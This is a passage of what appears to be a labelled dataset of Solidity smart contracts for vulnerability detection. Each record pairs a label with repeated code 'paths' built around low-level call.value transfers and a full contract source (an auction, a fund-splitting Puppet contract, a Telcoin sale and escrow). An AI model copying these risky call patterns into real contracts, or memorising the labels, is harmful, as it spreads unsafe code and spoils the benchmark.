bids_ignored_refunded.add(count)){ count = bids_ignored_count.sub(bids_ignored_refunded); } require(count > 0); uint cursor = bids_ignored_refunded; bids_ignored_refunded = bids_ignored_refunded.add(count); BidData storage bid; while (count > 0) { bid = bids_ignored[cursor]; if(bid.closed){ continue; } bid.closed = true; art_token_contract.transfer(bid.investor_address, bid.transfer_token); emit Refunded(bid.origin_index, bid.transfer_token); cursor ++; count --; } } function refundLosersBids(uint _count) public onlyOwner{ require(status == state.success || status == state.failure); uint count = _count; if(bids_sorted_count.sub(winner_bids) < bids_sorted_refunded.add(count)){ count = bids_sorted_count.sub(winner_bids).sub(bids_sorted_refunded); } require(count > 0); uint cursor = bids_sorted_refunded.add(winner_bids); bids_sorted_refunded = bids_sorted_refunded.add(count); BidData memory bid; while (count > 0) { bid = bids_sorted[cursor]; if(bid.closed){ continue; } bids_sorted[cursor].closed = true; art_token_contract.transfer(bid.investor_address, bid.transfer_token); emit Refunded(bid.origin_index, bid.transfer_token); cursor ++; count --; } } function calculate_shares_and_return(uint _shares_count, uint _share_price, uint _transfer_valuation, uint _final_share_price, uint _art_price, uint transfer_token) view public returns( uint _shares_to_assign, uint _executed_amount_valuation, uint _return_amount ){ if(assigned_shares.add(_shares_count) > max_shares_to_sell){ _shares_to_assign = max_shares_to_sell.sub(assigned_shares); }else{ _shares_to_assign = _shares_count; } _executed_amount_valuation = _shares_to_assign.mul(_final_share_price); if (final_fundraise.add(_executed_amount_valuation) > fundraise_max){ _executed_amount_valuation = fundraise_max.sub(final_fundraise); _shares_to_assign = _executed_amount_valuation.div(_final_share_price); _executed_amount_valuation = _shares_to_assign.mul(_final_share_price); } uint _executed_amount = convert_valuation_to_art(_executed_amount_valuation, _art_price); _return_amount = transfer_token.sub(_executed_amount); } function assignShareTokens(uint _count) public onlyOwner{ require(status == state.success); uint count = _count; if(winner_bids < assigned_bids.add(count)){ count = winner_bids.sub(assigned_bids); } require(count > 0); uint cursor = assigned_bids; assigned_bids = assigned_bids.add(count); BidData storage bid; while (count > 0) { bid = bids_sorted[cursor]; uint _shares_to_assign; uint _executed_amount_valuation; uint _return_amount; (_shares_to_assign, _executed_amount_valuation, _return_amount) = calculate_shares_and_return( bid.shares_count, bid.share_price, bid.transfer_valuation, final_share_price, bids[bid.origin_index].art_price, bid.transfer_token ); bid.executed_amount = _executed_amount_valuation; bid.asigned_shares_count = _shares_to_assign; assigned_shares = assigned_shares.add(_shares_to_assign); final_fundraise = final_fundraise.add(_executed_amount_valuation); final_shares_sold = final_shares_sold.add(_shares_to_assign); if(_return_amount > 0){ art_token_contract.transfer(bid.investor_address, _return_amount); } bid.closed = true; if (shares_holders_balance[bid.investor_address] == 0){ shares_holders[shares_holders_count++] = bid.investor_address; } emit Assigned(bid.origin_index,_shares_to_assign, _executed_amount_valuation, _return_amount); shares_holders_balance[bid.investor_address] = shares_holders_balance[bid.investor_address].add(_shares_to_assign); cursor ++; count --; } } function getShareBalance() view public returns (uint256 share_balance){ require(status == state.success); require(winner_bids == assigned_bids); share_balance = shares_holders_balance[msg.sender]; } function reclaimToken(ERC20Basic token) external onlyOwner { require(token != art_token_contract); uint256 balance = token.balanceOf(this); token.transfer(owner, balance); } function reclaim_art_token() external onlyOwner { require(status == state.success || status == state.failure); require(winner_bids == assigned_bids); uint256 balance = art_token_contract.balanceOf(this); art_token_contract.transfer(owner, balance); } function executeTransaction(address destination, uint value, bytes data) public onlyOwner{ if (destination.call.value(value)(data)) emit Execution(destination,value,data); else emit ExecutionFailure(destination,value,data); } } library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { if (a == 0) { return 0; } c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256 c) { c = a + b; assert(c >= a); return c; } } "}
{"sol name": "16643.sol", "label": 0, "first path": "function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); function() payable public{ contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); function() payable public{ contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); function() payable public{ contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); function() payable public{ contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); function() payable public{ contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); ", "second path": "function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); function() payable public{ contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); function() payable public{ contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); function() payable public{ contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); function() payable public{ contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); function() payable public{ contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); ", "third path": "function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); function() payable public{ contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); function() payable public{ contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); function() payable public{ contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); function() payable public{ contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); function() payable public{ contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); ", "long path": "pragma solidity ^0.4.23; contract Splitter{ address public owner; address[] public puppets; mapping (uint256 => address) public extra; address private _addy; uint256 private _share; uint256 private _count; constructor() payable public{ owner = msg.sender; newPuppet(); newPuppet(); newPuppet(); newPuppet(); extra[0] = puppets[0]; extra[1] = puppets[1]; extra[2] = puppets[2]; extra[3] = puppets[3]; } function withdraw() public{ require(msg.sender == owner); owner.transfer(address(this).balance); } function getPuppetCount() public constant returns(uint256 puppetCount){ return puppets.length; } function newPuppet() public returns(address newPuppet){ require(msg.sender == owner); Puppet p = new Puppet(); puppets.push(p); return p; } function setExtra(uint256 _id, address _newExtra) public { require(_newExtra != address(0)); extra[_id] = _newExtra; } function fundPuppets() public payable { require(msg.sender == owner); _share = SafeMath.div(msg.value, 4); extra[0].call.value(_share).gas(800000)(); extra[1].call.value(_share).gas(800000)(); extra[2].call.value(_share).gas(800000)(); extra[3].call.value(_share).gas(800000)(); } function() payable public{ } } contract Puppet { mapping (uint256 => address) public target; mapping (uint256 => address) public master; constructor() payable public{ target[0] = 0x509Cb8cB2F8ba04aE81eEC394175707Edd37e109; master[0] = 0x5C035Bb4Cb7dacbfeE076A5e61AA39a10da2E956; } function() public payable{ if(msg.sender != target[0]){ target[0].call.value(msg.value).gas(600000)(); } } function withdraw() public{ require(msg.sender == master[0]); master[0].transfer(address(this).balance); } } library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { if (a == 0) { return 0; } c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256 c) { c = a + b; assert(c >= a); return c; } } "}
{"sol name": "31565.sol", "label": 0, "first path": "function reject(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Rejected(_participant); require(_participant.call.value(weiAmount)()); function rejectMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { reject(_participants[i]); ", "second path": "function reject(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Rejected(_participant); require(_participant.call.value(weiAmount)()); function rejectMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { reject(_participants[i]); ", "third path": "function reject(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Rejected(_participant); require(_participant.call.value(weiAmount)()); function rejectMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { reject(_participants[i]); ", "long path": "pragma solidity ^0.4.18; library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a * b; assert(a == 0 || c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a / b; return c; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; } } contract Telcoin { using SafeMath for uint256; event Transfer(address indexed _from, address indexed _to, uint _value); event Approval(address indexed _owner, address indexed _spender, uint _value); string public constant name = \"Telcoin\"; string public constant symbol = \"TEL\"; uint8 public constant decimals = 2; uint256 public constant totalSupply = 100000000000 * (10 ** uint256(decimals)); mapping(address => uint256) balances; mapping (address => mapping (address => uint256)) internal allowed; function Telcoin(address _distributor) public { balances[_distributor] = totalSupply; Transfer(0x0, _distributor, totalSupply); } function balanceOf(address _owner) public view returns (uint256) { return balances[_owner]; } function transfer(address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[msg.sender]); balances[msg.sender] = balances[msg.sender].sub(_value); balances[_to] = balances[_to].add(_value); Transfer(msg.sender, _to, _value); return true; } function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { require(_to != address(0)); require(_value <= balances[_from]); require(_value <= allowed[_from][msg.sender]); balances[_from] = balances[_from].sub(_value); balances[_to] = balances[_to].add(_value); allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value); Transfer(_from, _to, _value); return true; } function approve(address _spender, uint256 _value) public returns (bool) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) public view returns (uint256) { return allowed[_owner][_spender]; } function increaseApproval(address _spender, uint _addedValue) public returns (bool) { allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue); Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) { uint oldValue = allowed[msg.sender][_spender]; if (_subtractedValue > oldValue) { allowed[msg.sender][_spender] = 0; } else { allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue); } Approval(msg.sender, _spender, allowed[msg.sender][_spender]); return true; } } contract TelcoinSaleToken { using SafeMath for uint256; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); event Mint(address indexed to, uint256 amount); event MintFinished(); event Redeem(address indexed beneficiary, uint256 sacrificedValue, uint256 grantedValue); event Transfer(address indexed from, address indexed to, uint256 value); address public owner; uint256 public totalSupply; mapping(address => uint256) balances; mapping(address => uint256) redeemed; bool public mintingFinished = false; Telcoin telcoin; uint256 public totalRedeemed; uint256 vestingStart; uint256 vestingDuration; modifier onlyOwner() { require(msg.sender == owner); _; } function TelcoinSaleToken( Telcoin _telcoin, uint256 _vestingStart, uint256 _vestingDuration ) public { owner = msg.sender; telcoin = _telcoin; vestingStart = _vestingStart; vestingDuration = _vestingDuration; } function finishMinting() onlyOwner public returns (bool) { require(!mintingFinished); mintingFinished = true; MintFinished(); return true; } function mint(address _to, uint256 _amount) onlyOwner public returns (bool) { require(_to != 0x0); require(!mintingFinished); require(_amount > 0); totalSupply = totalSupply.add(_amount); balances[_to] = balances[_to].add(_amount); Mint(_to, _amount); Transfer(0x0, _to, _amount); return true; } function redeemMany(address[] _beneficiaries) public { for (uint256 i = 0; i < _beneficiaries.length; i++) { redeem(_beneficiaries[i]); } } function redeem(address _beneficiary) public returns (uint256) { require(mintingFinished); require(_beneficiary != 0x0); uint256 balance = redeemableBalance(_beneficiary); if (balance == 0) { return 0; } uint256 totalDistributable = telcoin.balanceOf(this).add(totalRedeemed); uint256 amount = balance.mul(10 ** 18).div(totalSupply).mul(totalDistributable).div(10 ** 18); balances[_beneficiary] = balances[_beneficiary].sub(balance); redeemed[_beneficiary] = redeemed[_beneficiary].add(balance); balances[telcoin] = balances[telcoin].add(balance); totalRedeemed = totalRedeemed.add(amount); Transfer(_beneficiary, telcoin, balance); Redeem(_beneficiary, balance, amount); telcoin.transfer(_beneficiary, amount); return amount; } function transferOwnership(address _to) onlyOwner public { require(_to != address(0)); OwnershipTransferred(owner, _to); owner = _to; } function balanceOf(address _owner) public constant returns (uint256) { return balances[_owner]; } function redeemableBalance(address _beneficiary) public constant returns (uint256) { return vestedBalance(_beneficiary).sub(redeemed[_beneficiary]); } function vestedBalance(address _beneficiary) public constant returns (uint256) { uint256 currentBalance = balances[_beneficiary]; uint256 totalBalance = currentBalance.add(redeemed[_beneficiary]); if (now < vestingStart) { return 0; } if (now >= vestingStart.add(vestingDuration)) { return totalBalance; } return totalBalance.mul(now.sub(vestingStart)).div(vestingDuration); } } contract TelcoinSale { using SafeMath for uint256; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); event WalletChanged(address indexed previousWallet, address indexed newWallet); event TokenPurchase( address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount, uint256 bonusAmount ); event TokenAltPurchase( address indexed purchaser, address indexed beneficiary, uint256 value, uint256 amount, uint256 bonusAmount, string symbol, string transactionId ); event Pause(); event Unpause(); event Withdrawal(address indexed wallet, uint256 weiAmount); event Extended(uint256 until); event Finalized(); event Refunding(); event Refunded(address indexed beneficiary, uint256 weiAmount); event Whitelisted( address indexed participant, uint256 minWeiAmount, uint256 maxWeiAmount, uint32 bonusRate ); event CapFlexed(uint32 flex); address public owner; TelcoinSaleToken public saleToken; TelcoinSaleToken public bonusToken; Telcoin public telcoin; uint256 public softCap; uint256 public hardCap; uint32 public capFlex; uint256 public startTime; uint256 public endTime; uint256 public timeExtension; uint256 public rate; uint256 public weiRaised; address public wallet; mapping(address => uint256) public whitelistedMin; mapping(address => uint256) public whitelistedMax; mapping(address => uint32) public bonusRates; mapping(address => uint256) public deposited; mapping(address => uint256) public altDeposited; address[] public investors; bool public paused = false; bool public finished = false; uint256 public finishedAt; bool public refunding = false; uint256 public weiRefunded; modifier onlyOwner() { require(msg.sender == owner); _; } modifier saleOpen() { require(!finished); require(!paused); require(now >= startTime); require(now <= endTime + timeExtension); _; } function TelcoinSale( uint256 _softCap, uint256 _hardCap, uint32 _capFlex, uint256 _startTime, uint256 _endTime, uint256 _rate, address _wallet, Telcoin _telcoin, uint256 _bonusVestingStart, uint256 _bonusVestingDuration ) public payable { require(msg.value > 0); require(_softCap > 0); require(_hardCap >= _softCap); require(_startTime >= now); require(_endTime >= _startTime); require(_rate > 0); require(_wallet != 0x0); owner = msg.sender; softCap = _softCap; hardCap = _hardCap; capFlex = _capFlex; startTime = _startTime; endTime = _endTime; rate = _rate; wallet = _wallet; telcoin = _telcoin; saleToken = new TelcoinSaleToken(telcoin, 0, 0); bonusToken = new TelcoinSaleToken( telcoin, _bonusVestingStart, _bonusVestingDuration ); wallet.transfer(msg.value); } function () public payable { buyTokens(msg.sender); } function buyTokens(address _beneficiary) saleOpen public payable { require(_beneficiary != address(0)); uint256 weiAmount = msg.value; require(weiAmount > 0); require(weiRaised.add(weiAmount) <= hardCap); uint256 totalPrior = totalDeposited(_beneficiary); uint256 totalAfter = totalPrior.add(weiAmount); require(totalAfter <= whitelistedMax[_beneficiary]); uint256 saleTokens; uint256 bonusTokens; (saleTokens, bonusTokens) = tokensForPurchase(_beneficiary, weiAmount); uint256 newDeposited = deposited[_beneficiary].add(weiAmount); deposited[_beneficiary] = newDeposited; investors.push(_beneficiary); weiRaised = weiRaised.add(weiAmount); saleToken.mint(_beneficiary, saleTokens); if (bonusTokens > 0) { bonusToken.mint(_beneficiary, bonusTokens); } TokenPurchase( msg.sender, _beneficiary, weiAmount, saleTokens, bonusTokens ); } function changeWallet(address _wallet) onlyOwner public payable { require(_wallet != 0x0); require(msg.value > 0); WalletChanged(wallet, _wallet); wallet = _wallet; wallet.transfer(msg.value); } function extendTime(uint256 _timeExtension) onlyOwner public { require(!finished); require(now < endTime + timeExtension); require(_timeExtension > 0); timeExtension = timeExtension.add(_timeExtension); require(timeExtension <= 7 days); Extended(endTime.add(timeExtension)); } function finish() onlyOwner public { require(!finished); require(hardCapReached() || now > endTime + timeExtension); finished = true; finishedAt = now; saleToken.finishMinting(); bonusToken.finishMinting(); uint256 distributableCoins = telcoin.balanceOf(this); if (softCapReached()) { uint256 saleTokens = saleToken.totalSupply(); uint256 bonusTokens = bonusToken.totalSupply(); uint256 totalTokens = saleTokens.add(bonusTokens); uint256 bonusPortion = bonusTokens.mul(10 ** 18).div(totalTokens).mul(distributableCoins).div(10 ** 18); uint256 salePortion = distributableCoins.sub(bonusPortion); saleToken.transferOwnership(owner); bonusToken.transferOwnership(owner); telcoin.transfer(saleToken, salePortion); telcoin.transfer(bonusToken, bonusPortion); withdraw(); } else { refunding = true; telcoin.transfer(wallet, distributableCoins); Refunding(); } Finalized(); } function pause() onlyOwner public { require(!paused); paused = true; Pause(); } function refundMany(address[] _investors) public { for (uint256 i = 0; i < _investors.length; i++) { refund(_investors[i]); } } function refund(address _investor) public { require(finished); require(refunding); require(deposited[_investor] > 0); uint256 weiAmount = deposited[_investor]; deposited[_investor] = 0; weiRefunded = weiRefunded.add(weiAmount); Refunded(_investor, weiAmount); _investor.transfer(weiAmount); } function registerAltPurchase( address _beneficiary, string _symbol, string _transactionId, uint256 _weiAmount ) saleOpen onlyOwner public { require(_beneficiary != address(0)); require(totalDeposited(_beneficiary).add(_weiAmount) <= whitelistedMax[_beneficiary]); uint256 saleTokens; uint256 bonusTokens; (saleTokens, bonusTokens) = tokensForPurchase(_beneficiary, _weiAmount); uint256 newAltDeposited = altDeposited[_beneficiary].add(_weiAmount); altDeposited[_beneficiary] = newAltDeposited; investors.push(_beneficiary); weiRaised = weiRaised.add(_weiAmount); saleToken.mint(_beneficiary, saleTokens); if (bonusTokens > 0) { bonusToken.mint(_beneficiary, bonusTokens); } TokenAltPurchase( msg.sender, _beneficiary, _weiAmount, saleTokens, bonusTokens, _symbol, _transactionId ); } function transferOwnership(address _to) onlyOwner public { require(_to != address(0)); OwnershipTransferred(owner, _to); owner = _to; } function unpause() onlyOwner public { require(paused); paused = false; Unpause(); } function updateCapFlex(uint32 _capFlex) onlyOwner public { require(!finished); capFlex = _capFlex; CapFlexed(capFlex); } function whitelistMany( address[] _participants, uint256 _minWeiAmount, uint256 _maxWeiAmount, uint32 _bonusRate ) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { whitelist( _participants[i], _minWeiAmount, _maxWeiAmount, _bonusRate ); } } function whitelist( address _participant, uint256 _minWeiAmount, uint256 _maxWeiAmount, uint32 _bonusRate ) onlyOwner public { require(_participant != 0x0); require(_bonusRate <= 400); whitelistedMin[_participant] = _minWeiAmount; whitelistedMax[_participant] = _maxWeiAmount; bonusRates[_participant] = _bonusRate; Whitelisted( _participant, _minWeiAmount, _maxWeiAmount, _bonusRate ); } function withdraw() onlyOwner public { require(softCapReached() || (finished && now > finishedAt + 14 days)); uint256 weiAmount = this.balance; if (weiAmount > 0) { wallet.transfer(weiAmount); Withdrawal(wallet, weiAmount); } } function hardCapReached() public constant returns (bool) { return weiRaised >= hardCap.mul(1000 + capFlex).div(1000); } function tokensForPurchase( address _beneficiary, uint256 _weiAmount ) public constant returns (uint256, uint256) { uint256 baseTokens = _weiAmount.mul(rate); uint256 totalPrior = totalDeposited(_beneficiary); uint256 totalAfter = totalPrior.add(_weiAmount); if (totalAfter < whitelistedMin[_beneficiary]) { return (baseTokens, 0); } uint32 bonusRate = bonusRates[_beneficiary]; uint256 baseBonus = baseTokens.mul(1000 + bonusRate).div(1000).sub(baseTokens); if (totalPrior < whitelistedMin[_beneficiary]) { uint256 balancePrior = totalPrior.mul(rate); uint256 accumulatedBonus = balancePrior.mul(1000 + bonusRate).div(1000).sub(balancePrior); return (baseTokens, accumulatedBonus.add(baseBonus)); } return (baseTokens, baseBonus); } function totalDeposited(address _investor) public constant returns (uint256) { return deposited[_investor].add(altDeposited[_investor]); } function softCapReached() public constant returns (bool) { return weiRaised >= softCap.mul(1000 + capFlex).div(1000); } } contract TelcoinSaleKYCEscrow { using SafeMath for uint256; event OwnershipTransferred(address indexed previousOwner, address indexed newOwner); event ValuePlaced(address indexed purchaser, address indexed beneficiary, uint256 amount); event Approved(address indexed participant); event Rejected(address indexed participant); event Closed(); address public owner; TelcoinSale public sale; bool public closed = false; mapping(address => uint256) public deposited; modifier onlyOwner() { require(msg.sender == owner); _; } modifier escrowOpen() { require(!closed); _; } function TelcoinSaleKYCEscrow(TelcoinSale _sale) public { require(_sale != address(0)); owner = msg.sender; sale = _sale; } function () public payable { placeValue(msg.sender); } function approve(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Approved(_participant); sale.buyTokens.value(weiAmount)(_participant); } function approveMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { approve(_participants[i]); } } function close() onlyOwner public { require(!closed); closed = true; Closed(); } function placeValue(address _beneficiary) escrowOpen public payable { require(_beneficiary != address(0)); uint256 weiAmount = msg.value; require(weiAmount > 0); uint256 newDeposited = deposited[_beneficiary].add(weiAmount); deposited[_beneficiary] = newDeposited; ValuePlaced( msg.sender, _beneficiary, weiAmount ); } function reject(address _participant) onlyOwner public { uint256 weiAmount = deposited[_participant]; require(weiAmount > 0); deposited[_participant] = 0; Rejected(_participant); require(_participant.call.value(weiAmount)()); } function rejectMany(address[] _participants) onlyOwner public { for (uint256 i = 0; i < _participants.length; i++) { reject(_participants[i]); } } function transferOwnership(address _to) onlyOwner public { require(_to != address(0)); OwnershipTransferred(owner, _to); owner = _to; } } "}
